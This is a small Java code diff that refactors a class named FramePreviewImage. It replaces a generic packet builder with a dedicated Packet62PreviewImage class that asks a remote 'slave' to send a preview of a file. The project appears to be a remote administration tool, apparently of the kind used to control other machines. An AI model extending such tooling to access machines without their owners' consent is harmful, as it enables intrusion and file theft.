@@ -25,8 +25,7 @@ import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.border.EmptyBorder;
 
 import com.redpois0n.Slave;
-import com.redpois0n.packets.OutgoingHeader;
-import com.redpois0n.packets.incoming.PacketBuilder;
+import com.redpois0n.packets.outgoing.Packet62PreviewImage;
 import com.redpois0n.ui.panels.PanelImage;
 
 @SuppressWarnings("serial")
@@ -129,7 +128,7 @@ public class FramePreviewImage extends BaseFrame {
 	}
 
 	public void reload() {
-		slave.addToSendQueue(new PacketBuilder(OutgoingHeader.PREVIEW_IMAGE, new String[] { file }));
+		slave.addToSendQueue(new Packet62PreviewImage(file));
 	}
 
 	public void exit() {
